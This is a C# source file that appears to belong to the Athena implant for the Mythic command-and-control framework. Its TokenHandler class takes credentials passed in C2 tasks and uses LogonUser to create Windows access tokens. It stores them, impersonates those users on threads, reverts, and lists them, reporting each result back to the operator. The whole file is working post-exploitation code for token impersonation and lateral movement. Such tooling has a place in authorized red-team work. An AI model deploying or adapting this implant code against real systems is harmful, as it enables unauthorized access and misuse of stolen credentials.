#if DEBUG
#define WINBUILD
#endif

#if WINBUILD
using Athena.Models.Mythic.Tasks;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using PluginBase;
using Newtonsoft.Json;

namespace Athena.Commands
{
    public class TokenHandler
    {
        //static Dictionary<string, SafeAccessTokenHandle> tokens = new Dictionary<string, SafeAccessTokenHandle>();
        static Dictionary<string, Token> tokens = new Dictionary<string, Token>();
        static string impersonatedUser = "";

        public async Task<object> CreateToken(MythicJob job)
        {
            CreateToken tokenOptions = JsonConvert.DeserializeObject<CreateToken>(job.task.parameters);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                if (Pinvoke.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Pinvoke.LogonType.LOGON32_LOGON_NETWORK : Pinvoke.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Pinvoke.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    Token token = new Token()
                    {
                        Handle = hToken,
                        description  = tokenOptions.username,
                        TokenID = tokens.Count + 1
                    };
                    
                    if (tokenOptions.username.Contains("@"))
                    {
                        string[] split = tokenOptions.username.Split('@');
                        token.user = $"{split[1]}\\{split[0]}";
                    }
                    else
                    {
                        token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
                    }


                    tokens.Add(tokenOptions.name, token);
                    //tokens.Add(tokenOptions.name, hToken);

                    return new TokenResponseResult()
                    {
                        user_output = $"Token created for {tokenOptions.username}",
                        completed = "true",
                        task_id = job.task.id,
                        //tokens = new List<Token>() { token },
                        callback_tokens = new List<CallbackToken> { new CallbackToken()
                        {
                            action = "add",
                            host = System.Net.Dns.GetHostName(),
                            TokenID = token.TokenID,
                        } }
                        
                    };
                }
                else
                {
                    return new ResponseResult()
                    {
                        user_output = $"Failed to create token: {Marshal.GetLastWin32Error()}",
                        completed = "true",
                        task_id = job.task.id,
                    };
                }

            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = $"Failed to create token: {e.ToString()}",
                    status = "errored",
                    completed = "true",
                    task_id = job.task.id,
                };
            }
        }
        public async Task<bool> ThreadImpersonate()
        {
            if (!String.IsNullOrEmpty(impersonatedUser))
            {
                return Pinvoke.ImpersonateLoggedOnUser(tokens[impersonatedUser].Handle);
            }
            return true; //No impesronation to do so just return
        }
        public async Task<bool> ThreadRevert()
        {
            return Pinvoke.RevertToSelf();
        }
        public async Task<object> SetToken(MythicJob job)
        {
            var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
            string user = tokenInfo["name"].ToString();
            if (tokens.ContainsKey(user))
            {
                impersonatedUser = user;
                return new ResponseResult()
                {
                    user_output = $"Token set to {user}",
                    status = "success",
                    completed = "true",
                    task_id = job.task.id,
                };
            }

            return new ResponseResult()
            {
                user_output = $"No token with name: {user}",
                status = "errored",
                completed = "true",
                task_id = job.task.id,
            };
        }
        public async Task<object> RevertToSelf(MythicJob job)
        {
            impersonatedUser = "";

            return new ResponseResult()
            {
                user_output = $"No longer impersonating",
                status = "success",
                completed = "true",
                task_id = job.task.id,
            };
        }
        public async Task<object> ListTokens(MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Tokens:");
            sb.AppendLine("------------------------------");
            foreach (var token in tokens)
            {
                if (token.Key == impersonatedUser)
                {
                    sb.AppendFormat($"{token.Key} (Current)").AppendLine();

                }
                else
                {
                    sb.AppendFormat($"{token.Key}").AppendLine();

                }
            }

            return new ResponseResult()
            {
                completed = "true",
                status = "success",
                user_output = sb.ToString(),
                task_id = job.task.id,
            };
        }
    }
}
#endif
